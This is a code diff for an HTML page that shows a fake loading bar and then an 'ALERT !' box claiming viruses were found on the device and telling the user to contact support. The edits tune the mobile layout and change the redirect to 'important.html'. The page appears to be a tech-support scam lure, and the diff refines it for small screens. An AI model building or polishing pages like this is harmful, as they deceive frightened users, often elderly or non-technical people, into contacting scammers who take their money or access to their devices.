@@ -97,12 +97,12 @@
         }
 
         .spinner {
-            border: 5px solid #ccc;
+            /* border: 5px solid #ccc; */
             border-top: 5px solid #007BFF;
             border-radius: 50%;
             width: 50px;
             height: 50px;
-            animation: spin 1s linear infinite;
+            animation: spin 0.5s linear infinite;
         }
 
         @keyframes spin {
@@ -121,6 +121,53 @@
             font-weight: 300;
             color: #333;
         }
+        @media (max-width: 400px) {
+            .container {
+                height: 100vh;
+                position: fixed;
+                border: none;
+            }
+            .container h1{
+                font-size: 50px;
+                font-weight: 600;
+            }
+            .container p{
+                padding: 25px;
+                font-size: 30px;
+                margin-bottom: 10px;
+                font-weight: 500;
+            }
+            .container h3{
+                color: red;
+                font-size: 30px;
+            }
+            .container button{
+                font-size: 20px;
+            }
+            #loading{
+                top: -65px;
+            }
+            #loading p{
+                font-size: 25px;
+                font-weight: 600;
+            }
+        }
+        @media (max-width: 364px) {
+            .container{
+                position: fixed;
+            }
+            .container p{
+                padding: 0 40px;
+                font-size: 25px;
+                margin-bottom: 10px;
+                font-weight: 500;
+            }
+            .container h3{
+                padding: 0 40px;
+                color: red;
+                font-size: 30px;
+            }
+        }
     </style>
 </head>
 
@@ -132,6 +179,8 @@
             <div class="spinner"></div>
         </div>
     </div>
+
+
     <div class="container" id="container">
         <h1>ALERT !</h1>
         <p>Multiple suspicious files and Virus found in your device. Contact Support for further help.</p>
@@ -147,7 +196,7 @@
         }
         const loadingDuration = 8000;
 
-        const nextPageURL = "nextpage.html";
+        const nextPageURL = "important.html";
         setTimeout(() => {
             bar.style.display = 'none';
             container.style.display = 'block';
